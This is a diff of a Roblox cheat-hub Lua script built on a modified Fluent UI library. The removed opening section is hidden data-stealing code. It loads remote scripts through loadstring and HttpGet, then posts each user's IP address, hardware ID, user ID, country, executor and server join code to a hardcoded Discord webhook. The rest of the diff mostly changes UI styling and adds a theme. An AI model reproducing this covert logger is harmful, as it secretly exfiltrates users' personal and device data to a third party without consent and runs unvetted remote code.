@@ -1,457 +1,6 @@
 -- Fluent Mod
 
-_G.HoHoLoaded = true
-notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Notification.lua"))()
-local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
-local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
-
-wait(1)
-Notification:Notify(
-   {Title = "R2lx Hub", Description = "R2LX HUB"},
-   {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 5, Type = "option"},
-   {Image = "http://www.roblox.com/asset/?id=72839129717682", ImageColor = Color3.fromRGB(255, 84, 84), Callback = function(State) print(tostring(State)) end}
-)
-notify.New("Project Main 1.0", 60)
-notify.New("by R2LX and (cayngaydem) and T & Version X_X", 60)
-
-function PostWebhook(Url, message)
-    local request = http_request or request or HttpPost or syn.request
-    local data =
-        request(
-        {
-            Url = Url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode(message)
-        }
-    )
-    return ""
-end
-
-function AdminLoggerMsg()
-    AdminMessage = {
-        ["embeds"] = {
-            {
-                ["title"] = "**R2LX HUB Phiên Bản : Test**",
-                ["description"] ="",
-                ["type"] = "rich",
-                ["color"] = tonumber(0xf93dff),
-                ["fields"] = {
-                    {
-                        ["name"] = "**Username**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**UserID**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**PlaceID**",
-                        ["value"] = "```" .. game.PlaceId .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**IP Address**",
-                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**Hwid**",
-                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**JobID**",
-                        ["value"] = "```" .. game.JobId .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**Join Code**",
-                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
-                        ["inline"] = false
-                    }
-                },
-                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
-            }
-        }
-    }
-    return AdminMessage
-end
-
-PostWebhook("https://discord.com/api/webhooks/1333851587134754938/8wb5sBb2swZ3tcXQqJb_tBR8IVGPydbfQFl1LpKAhlFOZyaSZC8GAMytiwHhY3EeBaHm", AdminLoggerMsg()) -- Post to admin webhook
-
--- 🛠 Xác định Executor
--- 📌 Lấy thông tin thiết bị
-local UserInputService = game:GetService("UserInputService")
-local deviceType = "Unknown"
-
-if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-    deviceType = "Mobile"
-elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
-    deviceType = "PC"
-elseif UserInputService.GamepadEnabled then
-    deviceType = "Console"
-end
-
--- 📌 Xác định Executor
-local executor = "Unknown"
-local isMobile = false
-local isIOS = false
-local isAndroid = false
-
-if identifyexecutor then
-    executor = identifyexecutor()
-elseif syn then
-    executor = "Synapse X"
-elseif is_sirhurt_closure then
-    executor = "SirHurt"
-elseif secure_load then
-    executor = "Sentinel"
-elseif KRNL_LOADED then
-    executor = "KRNL"
-elseif fluxus then
-    executor = "Fluxus"
-elseif getexecutorname then
-    executor = getexecutorname()
-elseif is_synapse_function then
-    executor = "Synapse X (Detected by Function)"
-elseif (getgenv and debug and debug.getinfo) then
-    executor = "Possible PC Executor"
-elseif (writefile and readfile) then
-    executor = "Possible Mobile Executor"
-    
--- 📌 Executor dành cho iOS
-elseif (protect_gui and isfile) then
-    executor = "Delta (iOS)"
-    isMobile = true
-    isIOS = true
-elseif (hookfunction and getnamecallmethod) then
-    executor = "ScriptWare (iOS & PC)"
-    isMobile = true
-    isIOS = true
-elseif (isnetworkowner and islclosure) then
-    executor = "Arceus X (iOS)"
-    isMobile = true
-    isIOS = true
-elseif (getrawmetatable and setreadonly) then
-    executor = "Magma Executor (iOS)"
-    isMobile = true
-    isIOS = true
-
--- 📌 Executor dành cho Android
-elseif (protect_gui and isfile) then
-    executor = "Delta (Android)"  -- Thêm executor Delta cho Android
-    isMobile = true
-    isAndroid = true
-elseif (isexecutor and isfile) then
-    executor = "Electron (Android)"
-    isMobile = true
-    isAndroid = true
-elseif (isfile and readfile and writefile) then
-    executor = "Fluxus Mobile (Android)"
-    isMobile = true
-    isAndroid = true
-elseif (isnetworkowner and islclosure) then
-    executor = "Arceus X (Android)"
-    isMobile = true
-    isAndroid = true
-
--- 📌 Executor khác
-elseif (syn and syn.request) then
-    executor = "Synapse X (PC)"
-elseif (secure_call and syn) then
-    executor = "Comet (PC)"
-elseif (firetouchinterest and syn) then
-    executor = "Celestial (PC)"
-end
-
--- 📌 Xác định chính xác loại thiết bị
-if isMobile then
-    if isIOS then
-        deviceType = "Mobile (iOS)"
-    elseif isAndroid then
-        deviceType = "Mobile (Android)"
-    else
-        deviceType = "Mobile (Unknown OS)"
-    end
-end
-
--- 📌 Lấy thông tin nhân vật
-local player = game.Players.LocalPlayer
-local username = player.Name
-local displayName = player.DisplayName
-local userId = player.UserId
-local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
-local avatarLink = "https://www.roblox.com/users/" .. userId .. "/profile"
-
--- 📌 Lấy Hardware Key (Client ID)
-local hardwareKey = "Unknown"
-pcall(function()
-    hardwareKey = game:GetService("RbxAnalyticsService"):GetClientId()
-end)
-
--- 📌 Lấy thông tin thiết bị (SỬA LỖI)
-local UserInputService = game:GetService("UserInputService")
-local deviceType = "Unknown"
-
-if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-    deviceType = "Mobile"
-elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
-    deviceType = "PC"
-elseif UserInputService.GamepadEnabled then
-    deviceType = "Console"
-elseif syn or is_sirhurt_closure or secure_load or getexecutorname or isnetworkowner then
-    deviceType = "PC"  -- Nếu dùng các executor phổ biến cho PC, xác định là PC
-elseif protect_gui or isfile or hookfunction or islclosure then
-    deviceType = "Mobile"  -- Nếu có các hàm executor trên iOS/Android, xác định là Mobile
-end
-
--- 📌 Lấy thông tin tài khoản
-local accountAge = player.AccountAge
-local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-local gameId = game.PlaceId
-local currentTime = os.date("%Y-%m-%d %H:%M:%S")
-
--- 📌 Lấy thông tin về "Sea" (Thế giới)
-local seaName = "Unknown"
-if game.PlaceId == 2753915549 then -- Place ID cho Sea 1
-    seaName = "Sea 1"
-elseif game.PlaceId == 4442272183 then -- Place ID cho Sea 2
-    seaName = "Sea 2"
-elseif game.PlaceId == 7449423635 then -- Place ID cho Sea 3
-    seaName = "Sea 3"
-else
-    seaName = "Unknown Sea"
-end
-
--- 📌 Lấy số lượng người chơi hiện tại trong server
-local playerCount = #game.Players:GetPlayers()  
-
--- 📌 Số người chơi tối đa cố định là 12
-local maxPlayers = 12  
-
--- 📌 Kiểm tra xem người chơi có ở server VIP hay không
--- 📌 Kiểm tra xem người chơi có ở server VIP hay không
-local isVIPServer = false
-
--- Kiểm tra xem có phải server VIP không
-if game.PrivateServerId ~= "" and game.PrivateServerId ~= "00000000-0000-0000-0000-000000000000" then
-    isVIPServer = true
-end
-
--- 📌 Lấy IP Address
-local ipAddress = "Unknown"
-pcall(function()
-    ipAddress = game:HttpGet("https://api.ipify.org", true)
-end)
-
--- 📌 Lấy Job ID
-local jobId = game.JobId
-
--- 📌 Tạo Join Code
-local joinCode = "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. jobId .. "')"
-
--- 📌 Hàm sinh màu ngẫu nhiên
-local function generateRandomColor()
-    return tonumber(string.format("0x%02X%02X%02X", math.random(0, 255), math.random(0, 255), math.random(0, 255)))
-end
-
--- 📌 Lấy HttpService
-local HttpService = game:GetService("HttpService")
-local Webhook_URL = "https://discord.com/api/webhooks/1333851587134754938/8wb5sBb2swZ3tcXQqJb_tBR8IVGPydbfQFl1LpKAhlFOZyaSZC8GAMytiwHhY3EeBaHm"
-
-
--- 📌 Gửi thông báo lên Webhook Discord (SỬA LỖI TÊN THIẾT BỊ)
-local function guiThongBaoDiscord()
-    local randomColor = generateRandomColor()  
-
-    local response = request({
-        Url = Webhook_URL,
-        Method = 'POST',
-        Headers = { ['Content-Type'] = 'application/json' },
-        Body = HttpService:JSONEncode({
-            ["content"] = "",
-            ["embeds"] = {{
-                ["title"] = "**Script Đã Được Chạy!**",
-                ["description"] = "**" .. displayName .. "** đã chạy script.",
-                ["type"] = "rich",
-                ["color"] = randomColor,  
-                ["thumbnail"] = { ["url"] = avatarUrl },  
-                ["fields"] = {
-                    {
-                        ["name"] = "👤 Tên nhân vật:",
-                        ["value"] = username .. " (" .. displayName .. ")",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🆔 User ID:",
-                        ["value"] = tostring(userId),
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "⚡ Executor:",
-                        ["value"] = executor,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "📱 Tên thiết bị:",
-                        ["value"] = deviceType,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "📅 Tuổi tài khoản:",
-                        ["value"] = tostring(accountAge) .. " ngày",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🎮 Tên trò chơi:",
-                        ["value"] = gameName,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🆔 Game ID:",
-                        ["value"] = tostring(gameId),
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🔑 Hardware Key:",
-                        ["value"] = hardwareKey,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🌍 Thế giới (Sea):",
-                        ["value"] = seaName,
-                        ["inline"] = false
-                    },                    
-                    {
-                        ["name"] = "👥 Số người chơi trong server:",
-                        ["value"] = tostring(playerCount) .. "/12",  -- Luôn hiển thị /12
-                        ["inline"] = true
-                    },                    
-                    {
-                        ["name"] = "🌍 Server VIP/Thường:",
-                        ["value"] = isVIPServer and "VIP Server" or "Server Thường",  -- Thêm thông báo Server VIP/Thường
-                        ["inline"] = true
-                    },                    
-                    {
-                        ["name"] = "🌍 IP Address:",
-                        ["value"] = ipAddress,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🔗 Job ID:",
-                        ["value"] = jobId,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🔗 Join Code:",
-                        ["value"] = "```lua\n" .. joinCode .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "⏰ Thời gian gửi:",
-                        ["value"] = currentTime,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🔗 Link Avatar:",
-                        ["value"] = avatarLink,
-                        ["inline"] = false
-                    }
-                }
-            }}
-        })
-    })
-end
-
--- 🔥 Gửi thông báo khi script chạy
-guiThongBaoDiscord()
-
--- 📌 Hiển thị thông báo trên Roblox
-game.StarterGui:SetCore("SendNotification", {
-    Title = "Executor",
-    Text = "Bạn đang dùng: " .. executor,
-    Duration = 5
-})
-
--- 📌 Hiển thị thông báo trên Roblox về server VIP/Thường
-local serverStatusMessage = isVIPServer and "Bạn đang ở **Server VIP**" or "Bạn đang ở **Server Thường**"
-
-game.StarterGui:SetCore("SendNotification", {
-    Title = "Server Status",
-    Text = serverStatusMessage,
-    Duration = 5
-})
-
-local LocalizationService = game:GetService("LocalizationService")
-local player = game.Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
-
-local le = (game:GetService("Players").LocalPlayer.Data.Level.Value)
-local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
-local data = {
-    embeds = {
-        {
-            title = "R2lx New Player",
-            url = "https://www.roblox.com/users/" .. player.UserId,
-            description = "```" .. player.DisplayName .. " (" .. player.Name .. ") ```",
-            color = tonumber(0xffa500),
-            author = {
-                name = "Admin: R2LX and Enc and (cayngaydem)",
-                url = "https://cdn.discordapp.com/attachments/1226454597724409936/1233430491953107086/Screenshot_2024-04-20-17-04-30-945_com.zing.zalo-edit.jpg?ex=662d1129&is=662bbfa9&hm=345e588812e5489a8219d6939a7b94487e79f1153c99523094d207a830f2ccee&",
-                icon_url = "https://cdn.discordapp.com/attachments/1226454597724409936/1233430491953107086/Screenshot_2024-04-20-17-04-30-945_com.zing.zalo-edit.jpg?ex=662d1129&is=662bbfa9&hm=345e588812e5489a8219d6939a7b94487e79f1153c99523094d207a830f2ccee&"
-            },
-            image = {
-            	url = "https://cdn.discordapp.com/attachments/1229077309194113094/1233391929983504394/320688412_5524593467666764_7520827848036533185_n.gif?ex=662ced3f&is=662b9bbf&hm=25bf897861b49dc4d4e1320aa246bb05f9c5ba67d2a745106b9e0ad159981a55&"
-            },
-            footer = {
-                text = "R2lx Hub | Created by: Ari | https://discord.com/invite/E6ffTF57RG | Time: " .. os.date("%Y-%m-%d %H:%M:%S VN"),
-                icon_url = "https://discord.com/channels/1223639038724935680/1236316401640411237/1358066394746327122"
-            },
-            fields = {
-                {
-                    name = "ᴄᴏᴜɴᴛʀʏ🌐",
-                    value = "```" .. code .. "```",
-                    inline = true
-                },
-                {
-                    name = "ᴀɢᴇ📆",
-                    value = "```" .. player.AccountAge .. " Days```",
-                    inline = true
-                },
-                {
-                    name = "ᴇxᴇᴄᴜᴛᴏʀ💬",
-                    value = "```" .. identifyexecutor() .. "```",
-                    inline = true
-                },
-                {
-                    name = "ʟᴇᴠᴇʟ🆙:",
-                    value = "```" .. le .. "```",
-                    inline = true
-                },
-                {
-                    name = "ᴊᴏʙ ɪᴅ:",
-                    value = "```".. tostring(game.JobId) .."```",
-                    inline = true
-                },
-                {
-                    name = "sᴛᴀᴛᴜs❗",
-                    value = "```Người Dùng Đã Dùng Script Auto Farm Blox Fruit Cảm Ơn Bạn!!!```",
-                    inline = true
-                }
-            }
-        }
-    }
-}
-
-local jsonData = HttpService:JSONEncode(data)
-local webhookUrl = "https://discord.com/api/webhooks/1333851587134754938/8wb5sBb2swZ3tcXQqJb_tBR8IVGPydbfQFl1LpKAhlFOZyaSZC8GAMytiwHhY3EeBaHm"
-local headers = {["Content-Type"] = "application/json"}
-request = http_request or request or HttpPost or fluxus.request or syn.request or Krnl.request or delta.request;
-local request = http_request or request or HttpPost or syn.request
-local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}
+local a=Instance.new("ScreenGui")local b=Instance.new("TextLabel")a.Parent=game.CoreGui;a.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;b.Parent=a;b.BackgroundColor3=Color3.fromRGB(255,255,255)b.BackgroundTransparency=1.000;b.BorderColor3=Color3.fromRGB(0,0,0)b.BorderSizePixel=0;b.Position=UDim2.new(0,0,0.412030578,0)b.Size=UDim2.new(1,0,0.175591096,0)b.Font=Enum.Font.SourceSansSemibold;b.Text="262"b.TextColor3=Color3.fromRGB(255, 0, 0)b.TextScaled=true;b.TextSize=14.000;b.TextWrapped=true;local c=game:GetService('RunService')task.spawn(function()while true do local d=c.RenderStepped:Wait()b.Text='fps : '..tostring(math.floor(1/d))task.wait()end end)
 
 local old_tts = tostring;
 local a, b = {
@@ -469,6 +18,7 @@ local a, b = {
 				{
 					{50, "ModuleScript", {"Dark"}},
 					{54, "ModuleScript", {"Grey"}},		
+					{59, "ModuleScript", {"lua"}},		
 			     	{58, "ModuleScript", {"WibuTheme"}},		
 					{57, "ModuleScript", {"Gradien"}},		
 					{56, "ModuleScript", {"Enhanced"}},		
@@ -575,7 +125,7 @@ local MkButton = function()
 	stf.Size = UDim2.new(0.100000001, 0, 0.100000001, 0)
 	stf.SizeConstraint = Enum.SizeConstraint.RelativeYY
 	stf.Rotation = 360
-	UICorner.CornerRadius = UDim.new(0, 3)
+	UICorner.CornerRadius = UDim.new(0, 30)
 	UICorner.Parent = stf
 
 	DropShadow.Name = "DropShadow"
@@ -925,7 +475,7 @@ local aa = {
 								ImageTransparency = 0.7
 							}
 						),
-						j("UICorner", {CornerRadius = UDim.new(0, 8)}),
+						j("UICorner", {CornerRadius = UDim.new(0, 30)}),
 						j(
 							"Frame",
 							{
@@ -934,7 +484,7 @@ local aa = {
 								Name = "Background",
 								ThemeTag = {BackgroundColor3 = "AcrylicMain"}
 							},
-							{j("UICorner", {CornerRadius = UDim.new(0, 8)})}
+							{j("UICorner", {CornerRadius = UDim.new(0, 30)})}
 						),
 						j(
 							"Frame",
@@ -944,7 +494,7 @@ local aa = {
 								Size = UDim2.fromScale(1, 1)
 							},
 							{
-								j("UICorner", {CornerRadius = UDim.new(0, 8)}),
+								j("UICorner", {CornerRadius = UDim.new(0, 30)}),
 								j("UIGradient", {Rotation = 90, ThemeTag = {Color = "AcrylicGradient"}})
 							}
 						),
@@ -958,7 +508,7 @@ local aa = {
 								Size = UDim2.fromScale(1, 1),
 								BackgroundTransparency = 1
 							},
-							{j("UICorner", {CornerRadius = UDim.new(0, 8)})}
+							{j("UICorner", {CornerRadius = UDim.new(0, 30)})}
 						),
 						j(
 							"ImageLabel",
@@ -971,13 +521,13 @@ local aa = {
 								BackgroundTransparency = 1,
 								ThemeTag = {ImageTransparency = "AcrylicNoise"}
 							},
-							{j("UICorner", {CornerRadius = UDim.new(0, 8)})}
+							{j("UICorner", {CornerRadius = UDim.new(0, 30)})}
 						),
 						j(
 							"Frame",
 							{BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), ZIndex = 2},
 							{
-								j("UICorner", {CornerRadius = UDim.new(0, 8)}),
+								j("UICorner", {CornerRadius = UDim.new(0, 30)}),
 								j("UIStroke", {Transparency = 0.5, Thickness = 1, ThemeTag = {Color = "AcrylicBorder"}})
 							}
 						)
@@ -1071,14 +621,14 @@ local aa = {
 				k(
 					"Frame",
 					{Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ThemeTag = {BackgroundColor3 = "Hover"}},
-					{k("UICorner", {CornerRadius = UDim.new(0, 4)})}
+					{k("UICorner", {CornerRadius = UDim.new(0, 30)})}
 				)
 			p.Frame =
 				k(
 					"TextButton",
 					{Size = UDim2.new(0, 0, 0, 32), Parent = n, ThemeTag = {BackgroundColor3 = "DialogButton"}},
 					{
-						k("UICorner", {CornerRadius = UDim.new(0, 4)}),
+						k("UICorner", {CornerRadius = UDim.new(0, 30)}),
 						k(
 							"UIStroke",
 							{
@@ -1144,7 +694,7 @@ local aa = {
 						BackgroundTransparency = 1,
 						Parent = q.Window.Root
 					},
-					{p("UICorner", {CornerRadius = UDim.new(0, 8)})}
+					{p("UICorner", {CornerRadius = UDim.new(0, 30)})}
 				)
 			local t, u = m.SpringMotor(1, s.TintFrame, "BackgroundTransparency", true)
 			s.ButtonHolder =
@@ -1160,7 +710,7 @@ local aa = {
 						p(
 							"UIListLayout",
 							{
-								Padding = UDim.new(0, 10),
+								Padding = UDim.new(0, 45),
 								FillDirection = Enum.FillDirection.Horizontal,
 								HorizontalAlignment = Enum.HorizontalAlignment.Center,
 								SortOrder = Enum.SortOrder.LayoutOrder
@@ -1215,7 +765,7 @@ local aa = {
 						ThemeTag = {BackgroundColor3 = "Dialog"}
 					},
 					{
-						p("UICorner", {CornerRadius = UDim.new(0, 8)}),
+						p("UICorner", {CornerRadius = UDim.new(0, 30)}),
 						p("UIStroke", {Transparency = 0.5, ThemeTag = {Color = "DialogBorder"}}),
 						s.Scale,
 						s.Title,
@@ -1326,7 +876,7 @@ local aa = {
 							"UIListLayout",
 							{SortOrder = Enum.SortOrder.LayoutOrder, VerticalAlignment = Enum.VerticalAlignment.Center}
 						),
-						k("UIPadding", {PaddingBottom = UDim.new(0, 13), PaddingTop = UDim.new(0, 13)}),
+						k("UIPadding", {PaddingBottom = UDim.new(0, 20), PaddingTop = UDim.new(0, 20)}),
 						q.TitleLabel,
 						q.DescLabel
 					}
@@ -1354,7 +904,7 @@ local aa = {
 						LayoutOrder = 7,
 						ThemeTag = {BackgroundColor3 = "Element", BackgroundTransparency = "ElementTransparency"}
 					},
-					{k("UICorner", {CornerRadius = UDim.new(0, 4)}), q.Border, q.LabelHolder}
+					{k("UICorner", {CornerRadius = UDim.new(0, 30)}), q.Border, q.LabelHolder}
 				)
 			function q.SetTitle(r, s)
 				q.TitleLabel.Text = s
@@ -1436,7 +986,7 @@ local aa = {
 								HorizontalAlignment = Enum.HorizontalAlignment.Center,
 								SortOrder = Enum.SortOrder.LayoutOrder,
 								VerticalAlignment = Enum.VerticalAlignment.Bottom,
-								Padding = UDim.new(0, 20)
+								Padding = UDim.new(0, 45)
 							}
 						)
 					}
@@ -1519,7 +1069,7 @@ local aa = {
 							{
 								SortOrder = Enum.SortOrder.LayoutOrder,
 								VerticalAlignment = Enum.VerticalAlignment.Center,
-								Padding = UDim.new(0, 3)
+								Padding = UDim.new(0, 45)
 							}
 						),
 						r.ContentLabel,
@@ -1616,7 +1166,7 @@ local aa = {
 		local j = i.New
 		return function(k, l)
 			local m = {}
-			m.Layout = j("UIListLayout", {Padding = UDim.new(0, 5)})
+			m.Layout = j("UIListLayout", {Padding = UDim.new(0, 45)})
 			m.Container =
 				j(
 					"Frame",
@@ -1699,7 +1249,7 @@ local aa = {
 						ThemeTag = {BackgroundColor3 = "Tab"}
 					},
 					{
-						k("UICorner", {CornerRadius = UDim.new(0, 6)}),
+						k("UICorner", {CornerRadius = UDim.new(0, 30)}),
 						k(
 							"TextLabel",
 							{
@@ -1735,7 +1285,7 @@ local aa = {
 						)
 					}
 				)
-			local y = k("UIListLayout", {Padding = UDim.new(0, 5), SortOrder = Enum.SortOrder.LayoutOrder})
+			local y = k("UIListLayout", {Padding = UDim.new(0, 45), SortOrder = Enum.SortOrder.LayoutOrder})
 			x.ContainerFrame =
 				k(
 					"ScrollingFrame",
@@ -1902,7 +1452,7 @@ local aa = {
 						ThemeTag = {BackgroundColor3 = n and "Input" or "DialogInput"}
 					},
 					{
-						l("UICorner", {CornerRadius = UDim.new(0, 4)}),
+						l("UICorner", {CornerRadius = UDim.new(0, 30)}),
 						l(
 							"UIStroke",
 							{
@@ -1986,7 +1536,7 @@ local aa = {
 							ThemeTag = {BackgroundColor3 = "Text"}
 						},
 						{
-							l("UICorner", {CornerRadius = UDim.new(0, 7)}),
+							l("UICorner", {CornerRadius = UDim.new(0, 30)}),
 							l(
 								"ImageLabel",
 								{
@@ -2044,7 +1594,7 @@ local aa = {
 								l(
 									"UIListLayout",
 									{
-										Padding = UDim.new(0, 5),
+										Padding = UDim.new(0, 45),
 										FillDirection = Enum.FillDirection.Horizontal,
 										SortOrder = Enum.SortOrder.LayoutOrder
 									}
@@ -2177,7 +1727,7 @@ local aa = {
 						AnchorPoint = Vector2.new(0, 0.5),
 						ThemeTag = {BackgroundColor3 = "Accent"}
 					},
-					{s("UICorner", {CornerRadius = UDim.new(0, 2)})}
+					{s("UICorner", {CornerRadius = UDim.new(0, 30)})}
 				),
 			s(
 				"Frame",
@@ -2195,7 +1745,7 @@ local aa = {
 						CanvasSize = UDim2.fromScale(0, 0),
 						ScrollingDirection = Enum.ScrollingDirection.Y
 					},
-					{s("UIListLayout", {Padding = UDim.new(0, 4)})}
+					{s("UIListLayout", {Padding = UDim.new(0, 30)})}
 				)
 			local F =
 				s(
@@ -2741,7 +2291,7 @@ local aa = {
 				s(
 					"Frame",
 					{Size = UDim2.fromScale(1, 1), BackgroundColor3 = z.Value, Parent = A.Frame},
-					{s("UICorner", {CornerRadius = UDim.new(0, 4)})}
+					{s("UICorner", {CornerRadius = UDim.new(0, 30)})}
 				)
 			local aa, ab =
 				s(
@@ -2756,7 +2306,7 @@ local aa = {
 						ScaleType = Enum.ScaleType.Tile,
 						TileSize = UDim2.fromOffset(40, 40)
 					},
-					{s("UICorner", {CornerRadius = UDim.new(0, 4)}), B}
+					{s("UICorner", {CornerRadius = UDim.new(0, 30)}), B}
 				),
 			function()
 				local C = e(t.Dialog):Create()
@@ -2820,7 +2370,7 @@ local aa = {
 							BackgroundTransparency = 0,
 							Parent = C.Root
 						},
-						{s("UICorner", {CornerRadius = UDim.new(0, 4)}), K}
+						{s("UICorner", {CornerRadius = UDim.new(0, 30)}), K}
 					),
 				s(
 					"Frame",
@@ -2829,7 +2379,7 @@ local aa = {
 						Size = UDim2.fromScale(1, 1),
 						BackgroundTransparency = z.Transparency
 					},
-					{s("UICorner", {CornerRadius = UDim.new(0, 4)})}
+					{s("UICorner", {CornerRadius = UDim.new(0, 30)})}
 				)
 				local N, O =
 					s(
@@ -2845,15 +2395,15 @@ local aa = {
 							Parent = C.Root
 						},
 						{
-							s("UICorner", {CornerRadius = UDim.new(0, 4)}),
-							s("UIStroke", {Thickness = 2, Transparency = 0.75}),
+							s("UICorner", {CornerRadius = UDim.new(0, 30)}),
+							s("UIStroke", {Thickness = 10, Transparency = 0.75}),
 							M
 						}
 					),
 				s(
 					"Frame",
 					{BackgroundColor3 = z.Value, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 0},
-					{s("UICorner", {CornerRadius = UDim.new(0, 4)})}
+					{s("UICorner", {CornerRadius = UDim.new(0, 30)})}
 				)
 				local P, Q =
 					s(
@@ -2869,8 +2419,8 @@ local aa = {
 							Parent = C.Root
 						},
 						{
-							s("UICorner", {CornerRadius = UDim.new(0, 4)}),
-							s("UIStroke", {Thickness = 2, Transparency = 0.75}),
+							s("UICorner", {CornerRadius = UDim.new(0, 30)}),
+							s("UIStroke", {Thickness = 10, Transparency = 0.75}),
 							O
 						}
 					),
@@ -3258,7 +2808,7 @@ local aa = {
 						ThemeTag = {BackgroundColor3 = "DropdownFrame"}
 					},
 					{
-						e("UICorner", {CornerRadius = UDim.new(0, 5)}),
+						e("UICorner", {CornerRadius = UDim.new(0, 30)}),
 						e(
 							"UIStroke",
 							{
@@ -3271,7 +2821,7 @@ local aa = {
 						n
 					}
 				),
-			e("UIListLayout", {Padding = UDim.new(0, 3)})
+			e("UIListLayout", {Padding = UDim.new(0, 45)})
 			local t =
 				e(
 					"ScrollingFrame",
@@ -3296,7 +2846,7 @@ local aa = {
 					{Size = UDim2.fromScale(1, 0.6), ThemeTag = {BackgroundColor3 = "DropdownHolder"}},
 					{
 						t,
-						e("UICorner", {CornerRadius = UDim.new(0, 7)}),
+						e("UICorner", {CornerRadius = UDim.new(0, 30)}),
 						e(
 							"UIStroke",
 							{ApplyStrokeMode = Enum.ApplyStrokeMode.Border, ThemeTag = {Color = "DropdownBorder"}}
@@ -3422,7 +2972,7 @@ local aa = {
 								AnchorPoint = Vector2.new(0, 0.5),
 								ThemeTag = {BackgroundColor3 = "Accent"}
 							},
-							{e("UICorner", {CornerRadius = UDim.new(0, 2)})}
+							{e("UICorner", {CornerRadius = UDim.new(0, 30)})}
 						),
 					e(
 						"TextLabel",
@@ -3452,7 +3002,7 @@ local aa = {
 								Parent = t,
 								ThemeTag = {BackgroundColor3 = "DropdownOption"}
 							},
-							{K, L, e("UICorner", {CornerRadius = UDim.new(0, 6)})}
+							{K, L, e("UICorner", {CornerRadius = UDim.new(0, 30)})}
 							))
 					if j.Multi then
 						N = l.Value[I]
@@ -3756,8 +3306,8 @@ local aa = {
 						ThemeTag = {BackgroundColor3 = "Keybind"}
 					},
 					{
-						ai("UICorner", {CornerRadius = UDim.new(0, 5)}),
-						ai("UIPadding", {PaddingLeft = UDim.new(0, 8), PaddingRight = UDim.new(0, 8)}),
+						ai("UICorner", {CornerRadius = UDim.new(0, 30)}),
+						ai("UIPadding", {PaddingLeft = UDim.new(0, 30), PaddingRight = UDim.new(0, 30)}),
 						ai(
 							"UIStroke",
 							{
@@ -3928,7 +3478,7 @@ local aa = {
 					{
 						AnchorPoint = Vector2.new(0, 0.5),
 						Position = UDim2.new(0, -7, 0.5, 0),
-						Size = UDim2.fromOffset(20, 20),
+						Size = UDim2.fromOffset(14, 14),
 						Image = "http://www.roblox.com/asset/?id=12266946128",
 						ThemeTag = {ImageColor3 = "Accent"}
 					}
@@ -4069,7 +3619,7 @@ local aa = {
 						BackgroundTransparency = 1,
 						ThemeTag = {BackgroundColor3 = "Accent"}
 					},
-					{ai("UICorner", {CornerRadius = UDim.new(0, 9)}), k, j}
+					{ai("UICorner", {CornerRadius = UDim.new(0, 30)}), k, j}
 				)
 			function h.OnChanged(m, n)
 				h.Changed = n
@@ -5622,7 +5172,7 @@ local aa = {
 	end,
 	[47] = function()
 		local aa, ab, ac, ad, ae = b(47)
-		local af = {Names = {"Dark", "Darker", "Light", "Aqua", "Amethyst", "Rose", "Grey", "R2LX", "Enhanced", "Gradien", "WibuTheme"}}
+		local af = {Names = {"Dark", "Darker", "Light", "Aqua", "Amethyst", "Rose", "Grey", "R2LX", "Enhanced", "Gradien", "WibuTheme", "lua"}}
 		for ag, ah in next, ab:GetChildren() do
 			local aj = ac(ah)
 			af[aj.Name] = aj
@@ -6056,6 +5606,47 @@ end,
         SubText = Color3.fromRGB(120, 120, 120),
         Hover = Color3.fromRGB(178, 172, 255),
         HoverChange = 0.04
+    }
+end,
+
+[59] = function()
+    local aa, ab, ac, ad, ae = b(59)
+    return {
+        Name = "lua",
+        Accent = Color3.fromRGB(235, 120, 255), -- màu chủ đạo hồng tím
+        AcrylicMain = Color3.fromRGB(20, 20, 20), -- nền chính tối
+        AcrylicBorder = Color3.fromRGB(235, 120, 255), -- viền sáng hồng tím
